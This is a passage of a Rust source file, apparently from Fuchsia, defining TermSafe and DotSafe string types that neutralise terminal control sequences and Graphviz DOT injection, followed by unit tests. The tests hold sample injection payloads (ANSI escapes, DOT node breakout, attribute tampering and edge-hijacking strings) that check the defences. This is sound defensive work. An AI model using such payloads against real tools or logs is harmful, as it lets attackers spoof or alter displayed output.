// Copyright 2026 The Fuchsia Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

use serde::{Deserialize, Deserializer, Serialize, Serializer};
use std::borrow::{Borrow, Cow};
use std::convert::AsRef;
use std::error::Error;
use std::ffi::OsStr;
use std::fmt::{self, Debug, Display, Formatter};
use std::ops::Deref;
use std::path::{Path, PathBuf};
use std::str::FromStr;

/// Returns `true` if `c` is a control character that could affect terminal state.
///
/// This checks for both C0 (U+0000..=U+001F) and C1 (U+0080..=U+009F) control codes
/// as well as DEL (U+007F).
#[inline]
pub const fn is_control_character(c: char) -> bool {
    c.is_control()
}

/// Returns `true` if `s` contains any control characters.
#[inline]
pub fn contains_control_characters(s: &str) -> bool {
    s.chars().any(is_control_character)
}

/// An error indicating that a control character was found in a string when constructing
/// a [`SafeString`].
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct ControlCharError {
    /// The byte index in the string where the first control character was encountered.
    pub byte_index: usize,
    /// The control character that was encountered.
    pub character: char,
}

impl ControlCharError {
    /// Returns the byte index where the control character occurred.
    pub fn byte_index(&self) -> usize {
        self.byte_index
    }

    /// Returns the control character that caused the failure.
    pub fn character(&self) -> char {
        self.character
    }
}

impl Display for ControlCharError {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "string contains control character {:?} (U+{:04X}) at byte index {}",
            self.character, self.character as u32, self.byte_index
        )
    }
}

impl Error for ControlCharError {}

/// A safe string type that prevents terminal control injection attacks.
///
/// Terminal emulators interpret certain ASCII and Unicode control characters
/// (such as `ESC`, `CR`, `LF`, `BEL`, `BS`, and C1 controls) as commands to modify
/// terminal state. These control characters can change text formatting and colors,
/// move the cursor, overwrite earlier lines, clear the screen, or trigger terminal
/// operating system commands (OSC).
///
/// When untrusted strings (such as target names, device serial numbers, log messages,
/// or network metadata) are printed to the terminal, malicious or malformed inputs
/// containing control characters could alter terminal display or disguise output.
#[derive(Clone, Default, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct TermSafe(String);

impl TermSafe {
    /// Constructs a `TermSafe` by replacing all control characters with ([`char::REPLACEMENT_CHARACTER`] / `\u{FFFD}`)
    pub fn from_str_lossy(s: impl AsRef<str>) -> Self {
        let redacted: String = s
            .as_ref()
            .chars()
            .map(|c| if is_control_character(c) { char::REPLACEMENT_CHARACTER } else { c })
            .collect();
        Self(redacted)
    }

    /// Constructs a `TermSafe` by escaping all control characters with [`char::escape_default`].
    pub fn from_str_escaped(s: impl AsRef<str>) -> Self {
        let s = s.as_ref();
        if !contains_control_characters(s) {
            return Self(s.to_owned());
        }
        let mut out = String::with_capacity(s.len());
        for c in s.chars() {
            if is_control_character(c) {
                out.extend(c.escape_default());
            } else {
                out.push(c);
            }
        }
        Self(out)
    }

    /// Returns a slice referencing the contained string.
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Returns the contained string.
    pub fn into_inner(self) -> String {
        self.0
    }
}

impl Deref for TermSafe {
    type Target = str;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

impl AsRef<str> for TermSafe {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

impl AsRef<Path> for TermSafe {
    fn as_ref(&self) -> &Path {
        Path::new(&self.0)
    }
}

impl AsRef<OsStr> for TermSafe {
    fn as_ref(&self) -> &OsStr {
        OsStr::new(&self.0)
    }
}

impl AsRef<[u8]> for TermSafe {
    fn as_ref(&self) -> &[u8] {
        self.0.as_bytes()
    }
}

impl Borrow<str> for TermSafe {
    fn borrow(&self) -> &str {
        &self.0
    }
}

impl Display for TermSafe {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        Display::fmt(&self.0, f)
    }
}

impl Debug for TermSafe {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        f.debug_tuple("TermSafe").field(&self.0).finish()
    }
}

impl From<TermSafe> for String {
    fn from(safe_string: TermSafe) -> Self {
        safe_string.0
    }
}

impl From<TermSafe> for PathBuf {
    fn from(safe_string: TermSafe) -> Self {
        PathBuf::from(safe_string.0)
    }
}

impl<'a> From<TermSafe> for Cow<'a, str> {
    fn from(safe_string: TermSafe) -> Self {
        Cow::Owned(safe_string.0)
    }
}

impl<'a> From<&'a TermSafe> for Cow<'a, str> {
    fn from(safe_string: &'a TermSafe) -> Self {
        Cow::Borrowed(safe_string.as_str())
    }
}

impl TryFrom<&str> for TermSafe {
    type Error = ControlCharError;

    fn try_from(s: &str) -> Result<Self, Self::Error> {
        if let Some((byte_index, character)) =
            s.char_indices().find(|(_, c)| is_control_character(*c))
        {
            Err(ControlCharError { byte_index, character })
        } else {
            Ok(Self(s.to_owned()))
        }
    }
}

impl TryFrom<String> for TermSafe {
    type Error = ControlCharError;

    fn try_from(s: String) -> Result<Self, Self::Error> {
        Self::try_from(s.as_str())
    }
}

impl FromStr for TermSafe {
    type Err = ControlCharError;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Self::try_from(s)
    }
}

impl PartialEq<str> for TermSafe {
    fn eq(&self, other: &str) -> bool {
        self.0 == other
    }
}

impl PartialEq<&str> for TermSafe {
    fn eq(&self, other: &&str) -> bool {
        self.0 == *other
    }
}

impl PartialEq<String> for TermSafe {
    fn eq(&self, other: &String) -> bool {
        &self.0 == other
    }
}

impl PartialEq<TermSafe> for str {
    fn eq(&self, other: &TermSafe) -> bool {
        self == &other.0
    }
}

impl PartialEq<TermSafe> for &str {
    fn eq(&self, other: &TermSafe) -> bool {
        *self == &other.0
    }
}

impl PartialEq<TermSafe> for String {
    fn eq(&self, other: &TermSafe) -> bool {
        self == &other.0
    }
}

impl<'a> PartialEq<Cow<'a, str>> for TermSafe {
    fn eq(&self, other: &Cow<'a, str>) -> bool {
        self.0 == **other
    }
}

impl<'a> PartialEq<TermSafe> for Cow<'a, str> {
    fn eq(&self, other: &TermSafe) -> bool {
        **self == other.0
    }
}

impl Serialize for TermSafe {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        self.0.serialize(serializer)
    }
}

impl<'de> Deserialize<'de> for TermSafe {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        TermSafe::try_from(s).map_err(serde::de::Error::custom)
    }
}

/// Returns `true` if `c` is unsafe inside a Graphviz DOT string literal.
///
/// Unsafe characters include:
/// - Double quotes (`"`) which can break out of string literals.
/// - Backslashes (`\`) which serve as escape prefixes.
/// - ASCII and Unicode control characters (C0, C1, DEL).
#[inline]
pub const fn is_dot_unsafe_character(c: char) -> bool {
    c == '"' || c == '\\' || is_control_character(c)
}

/// Returns `true` if `s` contains any characters unsafe for Graphviz DOT format.
#[inline]
pub fn contains_dot_unsafe_characters(s: &str) -> bool {
    s.chars().any(is_dot_unsafe_character)
}

/// An error indicating that an unsafe DOT character was found in a string when constructing
/// a [`DotSafe`].
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct DotCharError {
    /// The byte index in the string where the first unsafe character was encountered.
    pub byte_index: usize,
    /// The unsafe character that was encountered.
    pub character: char,
}

impl DotCharError {
    /// Returns the byte index where the unsafe character occurred.
    pub fn byte_index(&self) -> usize {
        self.byte_index
    }

    /// Returns the unsafe character that caused the failure.
    pub fn character(&self) -> char {
        self.character
    }
}

impl Display for DotCharError {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "string contains unsafe DOT character {:?} (U+{:04X}) at byte index {}",
            self.character, self.character as u32, self.byte_index
        )
    }
}

impl Error for DotCharError {}

/// A safe string type that prevents Graphviz DOT injection attacks.
///
/// Graphviz DOT syntax interprets double quotes (`"`) as string boundaries and backslashes
/// (`\`) as escape characters. Control characters can corrupt graph parsers or trigger
/// terminal escape sequence execution.
///
/// When untrusted identifiers (such as node monikers, driver URLs, device names, or service
/// offer names) are emitted into DOT files, unescaped characters could allow an attacker
/// to break out of attributes or inject arbitrary graph nodes, edges, or styling.
#[derive(Clone, Default, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct DotSafe(String);

impl DotSafe {
    /// Constructs a `DotSafe` by escaping backslashes (`\` -> `\\`), double quotes (`"` -> `\"`),
    /// newlines (`\n` and `\r\n` -> `\n`), and replacing any remaining control characters with
    /// ([`char::REPLACEMENT_CHARACTER`] / `\u{FFFD}`).
    pub fn from_str_lossy(s: impl AsRef<str>) -> Self {
        let input = s.as_ref();
        let mut escaped = String::with_capacity(input.len());
        let mut chars = input.chars().peekable();
        while let Some(c) = chars.next() {
            match c {
                '\\' => escaped.push_str("\\\\"),
                '"' => escaped.push_str("\\\""),
                '\n' => escaped.push_str("\\n"),
                '\r' => {
                    if chars.peek() == Some(&'\n') {
                        chars.next();
                        escaped.push_str("\\n");
                    } else {
                        escaped.push(char::REPLACEMENT_CHARACTER);
                    }
                }
                c if is_control_character(c) => escaped.push(char::REPLACEMENT_CHARACTER),
                c => escaped.push(c),
            }
        }
        Self(escaped)
    }

    /// Returns a slice referencing the contained string.
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Returns the contained string.
    pub fn into_inner(self) -> String {
        self.0
    }
}

impl Deref for DotSafe {
    type Target = str;

    fn deref(&self) -> &Self::Target {
        &self.0
    }
}

impl AsRef<str> for DotSafe {
    fn as_ref(&self) -> &str {
        &self.0
    }
}

impl Borrow<str> for DotSafe {
    fn borrow(&self) -> &str {
        &self.0
    }
}

impl Display for DotSafe {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        Display::fmt(&self.0, f)
    }
}

impl Debug for DotSafe {
    fn fmt(&self, f: &mut Formatter<'_>) -> fmt::Result {
        f.debug_tuple("DotSafe").field(&self.0).finish()
    }
}

impl From<DotSafe> for String {
    fn from(safe_string: DotSafe) -> Self {
        safe_string.0
    }
}

impl TryFrom<&str> for DotSafe {
    type Error = DotCharError;

    fn try_from(s: &str) -> Result<Self, Self::Error> {
        if let Some((byte_index, character)) =
            s.char_indices().find(|(_, c)| is_dot_unsafe_character(*c))
        {
            Err(DotCharError { byte_index, character })
        } else {
            Ok(Self(s.to_owned()))
        }
    }
}

impl TryFrom<String> for DotSafe {
    type Error = DotCharError;

    fn try_from(s: String) -> Result<Self, Self::Error> {
        Self::try_from(s.as_str())
    }
}

impl FromStr for DotSafe {
    type Err = DotCharError;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        Self::try_from(s)
    }
}

impl PartialEq<str> for DotSafe {
    fn eq(&self, other: &str) -> bool {
        self.0 == other
    }
}

impl PartialEq<&str> for DotSafe {
    fn eq(&self, other: &&str) -> bool {
        self.0 == *other
    }
}

impl PartialEq<String> for DotSafe {
    fn eq(&self, other: &String) -> bool {
        &self.0 == other
    }
}

impl PartialEq<&String> for DotSafe {
    fn eq(&self, other: &&String) -> bool {
        &self.0 == *other
    }
}

impl PartialEq<DotSafe> for str {
    fn eq(&self, other: &DotSafe) -> bool {
        self == &other.0
    }
}

impl PartialEq<DotSafe> for &str {
    fn eq(&self, other: &DotSafe) -> bool {
        *self == &other.0
    }
}

impl PartialEq<DotSafe> for String {
    fn eq(&self, other: &DotSafe) -> bool {
        self == &other.0
    }
}

impl PartialEq<DotSafe> for &String {
    fn eq(&self, other: &DotSafe) -> bool {
        *self == &other.0
    }
}

impl Serialize for DotSafe {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        self.0.serialize(serializer)
    }
}

impl<'de> Deserialize<'de> for DotSafe {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        DotSafe::try_from(s).map_err(serde::de::Error::custom)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use assert_matches::assert_matches;
    use std::borrow::Borrow;
    use std::collections::{BTreeSet, HashSet};

    #[test]
    fn test_accepts_clean_strings() {
        let safe = TermSafe::try_from("hello-world_123").unwrap();
        assert_eq!(safe.as_str(), "hello-world_123");
        assert_eq!(safe.len(), 15);
        assert!(!safe.is_empty());
        assert_eq!(safe, "hello-world_123");

        let empty = TermSafe::try_from("").unwrap();
        assert_eq!(empty.as_str(), "");
        assert_eq!(empty.len(), 0);
        assert!(empty.is_empty());

        let unicode = TermSafe::try_from("こんにちは 🚀 世界").unwrap();
        assert_eq!(unicode.as_str(), "こんにちは 🚀 世界");
    }

    #[test]
    fn test_rejects_ascii_control_characters() {
        // ESC (\x1b)
        assert_matches!(
            TermSafe::try_from("hello\x1b[31mworld"),
            Err(ControlCharError { byte_index: 5, character: '\x1b' })
        );

        // NUL (\x00)
        assert_matches!(
            TermSafe::try_from("\x00prefix"),
            Err(ControlCharError { byte_index: 0, character: '\0' })
        );

        // BEL (\x07)
        assert_matches!(
            TermSafe::try_from("alert\x07"),
            Err(ControlCharError { byte_index: 5, character: '\x07' })
        );

        // BS (\x08)
        assert_matches!(
            TermSafe::try_from("back\x08space"),
            Err(ControlCharError { byte_index: 4, character: '\x08' })
        );

        // TAB (\t / \x09)
        assert_matches!(
            TermSafe::try_from("tab\tseparated"),
            Err(ControlCharError { byte_index: 3, character: '\t' })
        );

        // LF (\n / \x0a)
        assert_matches!(
            TermSafe::try_from("line1\nline2"),
            Err(ControlCharError { byte_index: 5, character: '\n' })
        );

        // CR (\r / \x0d)
        assert_matches!(
            TermSafe::try_from("line1\rline2"),
            Err(ControlCharError { byte_index: 5, character: '\r' })
        );

        // DEL (\x7f)
        assert_matches!(
            TermSafe::try_from("delete\x7fchar"),
            Err(ControlCharError { byte_index: 6, character: '\x7f' })
        );
    }

    #[test]
    fn test_rejects_c1_control_characters() {
        // C1 CSI (\u{009B})
        assert_matches!(
            TermSafe::try_from("c1_\u{009b}_control"),
            Err(ControlCharError { byte_index: 3, character: '\u{009B}' })
        );

        // C1 OSC (\u{009D})
        assert_matches!(
            TermSafe::try_from("c1_\u{009d}_osc"),
            Err(ControlCharError { byte_index: 3, character: '\u{009D}' })
        );

        // C1 boundary U+0080
        assert_matches!(
            TermSafe::try_from("c1_\u{0080}"),
            Err(ControlCharError { byte_index: 3, character: '\u{0080}' })
        );

        // C1 boundary U+009F
        assert_matches!(
            TermSafe::try_from("c1_\u{009f}"),
            Err(ControlCharError { byte_index: 3, character: '\u{009F}' })
        );
    }

    #[test]
    fn test_multi_byte_utf8_error_index() {
        // "こんにちは" is 15 bytes (3 bytes per character)
        let s = "こんにちは\x1b[31m";
        let err = TermSafe::try_from(s).unwrap_err();
        assert_eq!(err.byte_index(), 15);
        assert_eq!(err.character(), '\x1b');
    }

    #[test]
    fn test_from_str_lossy() {
        let s = "hello\x1b[31mworld\x07!";
        let safe = TermSafe::from_str_lossy(s);
        assert_eq!(
            safe.as_str(),
            &format!(
                "hello{}[31mworld{}!",
                char::REPLACEMENT_CHARACTER,
                char::REPLACEMENT_CHARACTER
            )
        );

        // String without control characters is unmodified
        let clean = "clean_string";
        assert_eq!(TermSafe::from_str_lossy(clean).as_str(), clean);
    }

    #[test]
    fn test_conversions_and_traits() {
        let safe = TermSafe::try_from("test string").unwrap();

        // Display
        assert_eq!(format!("{safe}"), "test string");

        // Debug
        assert_eq!(format!("{safe:?}"), "TermSafe(\"test string\")");

        // Deref
        assert!(safe.starts_with("test"));
        assert!(safe.ends_with("string"));
        assert_eq!(&safe[0..4], "test");

        // AsRef
        let s_ref: &str = safe.as_ref();
        assert_eq!(s_ref, "test string");

        // Borrow
        let borrowed: &str = safe.borrow();
        assert_eq!(borrowed, "test string");

        // From / Into String
        let owned: String = safe.clone().into();
        assert_eq!(owned, "test string");
        assert_eq!(safe.clone().into_inner(), "test string");

        // FromStr
        let parsed = "parsed_str".parse::<TermSafe>().unwrap();
        assert_eq!(parsed, "parsed_str");
        assert!("bad\nstr".parse::<TermSafe>().is_err());

        // TryFrom
        assert_eq!(TermSafe::try_from("good").unwrap(), "good");
        assert!(TermSafe::try_from("bad\0").is_err());
        assert_eq!(TermSafe::try_from(String::from("good_owned")).unwrap(), "good_owned");
        assert!(TermSafe::try_from(String::from("bad\x1b_owned")).is_err());

        // PartialEq comparisons
        let s = TermSafe::try_from("abc").unwrap();
        assert_eq!(s, "abc");
        assert_eq!("abc", s);
        assert_eq!(s, *"abc");
        assert_eq!(*"abc", s);
        assert_eq!(s, String::from("abc"));
        assert_eq!(String::from("abc"), s);

        // Default
        let default_safe = TermSafe::default();
        assert_eq!(default_safe, "");

        // Path and OsStr
        let path: &Path = safe.as_ref();
        assert_eq!(path, Path::new("test string"));
        let os_str: &OsStr = safe.as_ref();
        assert_eq!(os_str, OsStr::new("test string"));
        let bytes: &[u8] = safe.as_ref();
        assert_eq!(bytes, b"test string");
        let path_buf: PathBuf = safe.clone().into();
        assert_eq!(path_buf, PathBuf::from("test string"));

        // Cow
        let cow_owned: Cow<'_, str> = safe.clone().into();
        assert_eq!(cow_owned, Cow::Borrowed("test string"));
        let cow_borrowed: Cow<'_, str> = (&safe).into();
        assert_eq!(cow_borrowed, Cow::Borrowed("test string"));
        assert_eq!(safe, Cow::Borrowed("test string"));
        assert_eq!(Cow::Borrowed("test string"), safe);
    }

    #[test]
    fn test_from_str_escaped() {
        let s = "hello\x1b[31mworld\x07!\r\n";
        let safe = TermSafe::from_str_escaped(s);
        assert_eq!(safe.as_str(), "hello\\u{1b}[31mworld\\u{7}!\\r\\n");

        // String without control characters is unmodified
        let clean = "clean_string";
        assert_eq!(TermSafe::from_str_escaped(clean).as_str(), clean);
    }

    #[test]
    fn test_error_display() {
        let err = TermSafe::try_from("foo\x1bbar").unwrap_err();
        let display_msg = format!("{err}");
        assert!(display_msg.contains("byte index 3"));
        assert!(display_msg.contains("U+001B"));
    }

    #[test]
    fn test_serde_json() {
        let safe = TermSafe::try_from("serde_test").unwrap();
        let json = serde_json::to_string(&safe).unwrap();
        assert_eq!(json, "\"serde_test\"");

        let deserialized: TermSafe = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized, safe);

        // Deserializing control characters should fail
        let bad_json = "\"hello\\u001bworld\"";
        let res: Result<TermSafe, _> = serde_json::from_str(bad_json);
        assert!(res.is_err());
    }

    #[test]
    fn test_is_control_and_contains_control() {
        assert!(is_control_character('\x1b'));
        assert!(is_control_character('\0'));
        assert!(is_control_character('\n'));
        assert!(!is_control_character('a'));
        assert!(!is_control_character(' '));
        assert!(!is_control_character('🦀'));

        assert!(contains_control_characters("hello\nworld"));
        assert!(!contains_control_characters("hello world 🦀"));
    }

    // =========================================================================
    // DotSafe Unit Tests
    // =========================================================================

    #[test]
    fn test_dot_safe_accepts_clean_alphanumeric() {
        let safe = DotSafe::try_from("node_123-service").unwrap();
        assert_eq!(safe.as_str(), "node_123-service");
        assert_eq!(safe.len(), 16);
        assert!(!safe.is_empty());
        assert_eq!(safe, "node_123-service");
    }

    #[test]
    fn test_dot_safe_accepts_allowed_punctuation() {
        let punctuation = ".-_/:@~+=?!&()[]{}<>;,*^%$#|'";
        let safe = DotSafe::try_from(punctuation).unwrap();
        assert_eq!(safe.as_str(), punctuation);
    }

    #[test]
    fn test_dot_safe_accepts_empty_and_spaces() {
        let empty = DotSafe::try_from("").unwrap();
        assert_eq!(empty.as_str(), "");
        assert_eq!(empty.len(), 0);
        assert!(empty.is_empty());

        let spaces = DotSafe::try_from("   hello world   ").unwrap();
        assert_eq!(spaces.as_str(), "   hello world   ");
    }

    #[test]
    fn test_dot_safe_accepts_multibyte_unicode() {
        let unicode_samples = [
            "こんにちは 🚀 世界",
            "你好 驱动节点",
            "Geräteüberwachung üöäß",
            "Café résumé",
            "∀x ∈ ℝ : x² ≥ 0",
            "שלום עולם",
            "مرحبا بالعالم",
            "🦀✨🔒",
        ];

        for sample in unicode_samples {
            let safe = DotSafe::try_from(sample).unwrap();
            assert_eq!(safe.as_str(), sample);
        }
    }

    #[test]
    fn test_dot_safe_from_str_lossy_double_quotes() {
        assert_eq!(DotSafe::from_str_lossy("foo").as_str(), "foo");
        assert_eq!(DotSafe::from_str_lossy(r#""foo""#).as_str(), r#"\"foo\""#);
        assert_eq!(DotSafe::from_str_lossy(r#""""#).as_str(), r#"\"\""#);
        assert_eq!(DotSafe::from_str_lossy(r#"a"b"c"#).as_str(), r#"a\"b\"c"#);
        assert_eq!(DotSafe::from_str_lossy("\"\"\"\"").as_str(), r#"\"\"\"\""#);
    }

    #[test]
    fn test_dot_safe_from_str_lossy_backslashes() {
        assert_eq!(DotSafe::from_str_lossy(r#"\path\to"#).as_str(), r#"\\path\\to"#);
        assert_eq!(DotSafe::from_str_lossy(r#"foo\"#).as_str(), r#"foo\\"#);
        assert_eq!(DotSafe::from_str_lossy(r#"\foo"#).as_str(), r#"\\foo"#);
        assert_eq!(DotSafe::from_str_lossy(r#"foo\\bar"#).as_str(), r#"foo\\\\bar"#);
    }

    #[test]
    fn test_dot_safe_from_str_lossy_combinations() {
        assert_eq!(DotSafe::from_str_lossy(r#""foo\"bar""#).as_str(), r#"\"foo\\\"bar\""#);
        assert_eq!(DotSafe::from_str_lossy(r#"\"#).as_str(), r#"\\"#);
        assert_eq!(DotSafe::from_str_lossy(r#"\""#).as_str(), r#"\\\""#);
        assert_eq!(DotSafe::from_str_lossy(r#"\\""#).as_str(), r#"\\\\\""#);
        assert_eq!(DotSafe::from_str_lossy(r#"a"b\c"d\e"#).as_str(), r#"a\"b\\c\"d\\e"#);
        assert_eq!(
            DotSafe::from_str_lossy(r#"\"foo\\\"bar\""#).as_str(),
            r#"\\\"foo\\\\\\\"bar\\\""#
        );
    }

    #[test]
    fn test_dot_safe_from_str_lossy_newlines() {
        assert_eq!(DotSafe::from_str_lossy("line1\nline2").as_str(), "line1\\nline2");
        assert_eq!(DotSafe::from_str_lossy("line1\r\nline2").as_str(), "line1\\nline2");
        assert_eq!(
            DotSafe::from_str_lossy("line1\rline2").as_str(),
            format!("line1{}line2", char::REPLACEMENT_CHARACTER)
        );
        assert_eq!(DotSafe::from_str_lossy("\n\n\n").as_str(), "\\n\\n\\n");
        assert_eq!(DotSafe::from_str_lossy("\r\n\r\n").as_str(), "\\n\\n");
    }

    #[test]
    fn test_dot_safe_from_str_lossy_control_characters() {
        let rep = char::REPLACEMENT_CHARACTER;

        // NUL
        assert_eq!(DotSafe::from_str_lossy("hello\0world").as_str(), format!("hello{rep}world"));

        // BEL, BS, TAB
        assert_eq!(
            DotSafe::from_str_lossy("a\x07b\x08c\td").as_str(),
            format!("a{rep}b{rep}c{rep}d")
        );

        // ESC, DEL
        assert_eq!(
            DotSafe::from_str_lossy("ansi\x1b[31mred\x7f").as_str(),
            format!("ansi{rep}[31mred{rep}")
        );

        // C1 controls
        assert_eq!(
            DotSafe::from_str_lossy("c1_\u{0080}_\u{009b}_\u{009f}").as_str(),
            format!("c1_{rep}_{rep}_{rep}")
        );

        // Mixed with newlines and quotes
        assert_eq!(
            DotSafe::from_str_lossy("alert\x07: \"status\"\ncode\x1b").as_str(),
            format!("alert{rep}: \\\"status\\\"\\ncode{rep}")
        );
    }

    #[test]
    fn test_dot_safe_rejects_quotes() {
        assert_matches!(
            DotSafe::try_from(r#"hello"world"#),
            Err(DotCharError { byte_index: 5, character: '"' })
        );
        assert_matches!(
            DotSafe::try_from(r#""start"#),
            Err(DotCharError { byte_index: 0, character: '"' })
        );
        assert_matches!(
            DotSafe::try_from(r#"end""#),
            Err(DotCharError { byte_index: 3, character: '"' })
        );
    }

    #[test]
    fn test_dot_safe_rejects_backslashes() {
        assert_matches!(
            DotSafe::try_from(r#"hello\world"#),
            Err(DotCharError { byte_index: 5, character: '\\' })
        );
        assert_matches!(
            DotSafe::try_from(r#"\start"#),
            Err(DotCharError { byte_index: 0, character: '\\' })
        );
        assert_matches!(
            DotSafe::try_from(r#"end\"#),
            Err(DotCharError { byte_index: 3, character: '\\' })
        );
    }

    #[test]
    fn test_dot_safe_rejects_newlines_and_tabs() {
        assert_matches!(
            DotSafe::try_from("line1\nline2"),
            Err(DotCharError { byte_index: 5, character: '\n' })
        );
        assert_matches!(
            DotSafe::try_from("line1\r\nline2"),
            Err(DotCharError { byte_index: 5, character: '\r' })
        );
        assert_matches!(
            DotSafe::try_from("line1\rline2"),
            Err(DotCharError { byte_index: 5, character: '\r' })
        );
        assert_matches!(
            DotSafe::try_from("tab\tseparated"),
            Err(DotCharError { byte_index: 3, character: '\t' })
        );
    }

    #[test]
    fn test_dot_safe_rejects_control_characters() {
        // NUL
        assert_matches!(
            DotSafe::try_from("\0prefix"),
            Err(DotCharError { byte_index: 0, character: '\0' })
        );
        // ESC
        assert_matches!(
            DotSafe::try_from("ansi\x1b[31m"),
            Err(DotCharError { byte_index: 4, character: '\x1b' })
        );
        // BEL
        assert_matches!(
            DotSafe::try_from("alert\x07"),
            Err(DotCharError { byte_index: 5, character: '\x07' })
        );
        // DEL
        assert_matches!(
            DotSafe::try_from("del\x7fchar"),
            Err(DotCharError { byte_index: 3, character: '\x7f' })
        );
        // C1 controls
        assert_matches!(
            DotSafe::try_from("c1_\u{0080}"),
            Err(DotCharError { byte_index: 3, character: '\u{0080}' })
        );
        assert_matches!(
            DotSafe::try_from("c1_\u{009b}"),
            Err(DotCharError { byte_index: 3, character: '\u{009B}' })
        );
        assert_matches!(
            DotSafe::try_from("c1_\u{009f}"),
            Err(DotCharError { byte_index: 3, character: '\u{009F}' })
        );
    }

    #[test]
    fn test_dot_safe_multibyte_utf8_error_index() {
        // "日本語" is 9 bytes (3 bytes per character)
        let s1 = "日本語\"test";
        let err1 = DotSafe::try_from(s1).unwrap_err();
        assert_eq!(err1.byte_index(), 9);
        assert_eq!(err1.character(), '"');

        // "🦀" is 4 bytes
        let s2 = "🦀\\shell";
        let err2 = DotSafe::try_from(s2).unwrap_err();
        assert_eq!(err2.byte_index(), 4);
        assert_eq!(err2.character(), '\\');

        // "Café" is 5 bytes ('é' is 2 bytes)
        let s3 = "Café\u{009b}bar";
        let err3 = DotSafe::try_from(s3).unwrap_err();
        assert_eq!(err3.byte_index(), 5);
        assert_eq!(err3.character(), '\u{009B}');
    }

    #[test]
    fn test_dot_safe_error_display_and_trait() {
        let err = DotSafe::try_from(r#"foo"bar"#).unwrap_err();
        assert_eq!(err.byte_index(), 3);
        assert_eq!(err.character(), '"');

        let msg = format!("{err}");
        assert!(msg.contains("byte index 3"));
        assert!(msg.contains("U+0022"));

        // Verify std::error::Error
        let _: &dyn std::error::Error = &err;
    }

    #[test]
    fn test_dot_safe_attack_node_breakout() {
        let payload = "\"}; node [color=red]; {\"";
        assert!(DotSafe::try_from(payload).is_err());

        let escaped = DotSafe::from_str_lossy(payload);
        assert_eq!(escaped.as_str(), r#"\"}; node [color=red]; {\""#);

        // Rendering inside a DOT node definition
        let dot_line = format!(r#"    "{}" [label="{}"]"#, "node_1", escaped);
        assert_eq!(dot_line, r#"    "node_1" [label="\"}; node [color=red]; {\""]"#);
    }

    #[test]
    fn test_dot_safe_attack_attribute_tampering() {
        let payload = r#"] label="injected" [ "#;
        assert!(DotSafe::try_from(payload).is_err());

        let escaped = DotSafe::from_str_lossy(payload);
        assert_eq!(escaped.as_str(), r#"] label=\"injected\" [ "#);

        let dot_line = format!(r#"    "node_1" [label="{}"]"#, escaped);
        assert_eq!(dot_line, r#"    "node_1" [label="] label=\"injected\" [ "] "#.trim_end());
    }

    #[test]
    fn test_dot_safe_attack_edge_hijacking() {
        let payload = r#"" -> "evil_target" [color=red]; "node_1"#;
        assert!(DotSafe::try_from(payload).is_err());

        let escaped = DotSafe::from_str_lossy(payload);
        assert_eq!(escaped.as_str(), r#"\" -> \"evil_target\" [color=red]; \"node_1"#);

        let dot_line = format!(r#"    "{}" -> "{}""#, "node_1", escaped);
        assert_eq!(dot_line, r#"    "node_1" -> "\" -> \"evil_target\" [color=red]; \"node_1""#);
    }

    #[test]
    fn test_dot_safe_attack_html_labels_and_comments() {
        // HTML tags without quotes are clean strings and rendered as literals inside "..."
        let clean_html = "<TABLE><TR><TD>Safe</TD></TR></TABLE>";
        let safe = DotSafe::try_from(clean_html).unwrap();
        assert_eq!(safe.as_str(), clean_html);

        // HTML tags with quotes must be escaped
        let payload_html_quotes = r#"<TABLE BORDER="0"><TR><TD>Injected</TD></TR></TABLE>"#;
        assert!(DotSafe::try_from(payload_html_quotes).is_err());
        let escaped_html = DotSafe::from_str_lossy(payload_html_quotes);
        assert_eq!(
            escaped_html.as_str(),
            r#"<TABLE BORDER=\"0\"><TR><TD>Injected</TD></TR></TABLE>"#
        );

        // Comment injection
        let comment_payload = "\" // comment \n node [color=red]; \"";
        assert!(DotSafe::try_from(comment_payload).is_err());
        let escaped_comment = DotSafe::from_str_lossy(comment_payload);
        assert_eq!(escaped_comment.as_str(), "\\\" // comment \\n node [color=red]; \\\"");
    }

    #[test]
    fn test_dot_safe_attack_trailing_backslash_escape() {
        let payload = r#"path\"#;
        assert!(DotSafe::try_from(payload).is_err());

        let escaped = DotSafe::from_str_lossy(payload);
        assert_eq!(escaped.as_str(), r#"path\\"#);

        // When rendered in DOT, trailing backslash is escaped so closing quote is preserved
        let dot_line = format!(r#"    "{}" [label="{}"]"#, "node_1", escaped);
        assert_eq!(dot_line, r#"    "node_1" [label="path\\"]"#);
    }

    #[test]
    fn test_dot_safe_traits_and_conversions() {
        let safe = DotSafe::try_from("test-value").unwrap();

        // Display
        assert_eq!(format!("{safe}"), "test-value");

        // Debug
        assert_eq!(format!("{safe:?}"), "DotSafe(\"test-value\")");

        // Deref
        assert_eq!(safe.len(), 10);
        assert!(safe.starts_with("test"));
        assert!(safe.ends_with("value"));
        assert_eq!(&safe[0..4], "test");

        // AsRef
        let s_ref: &str = safe.as_ref();
        assert_eq!(s_ref, "test-value");

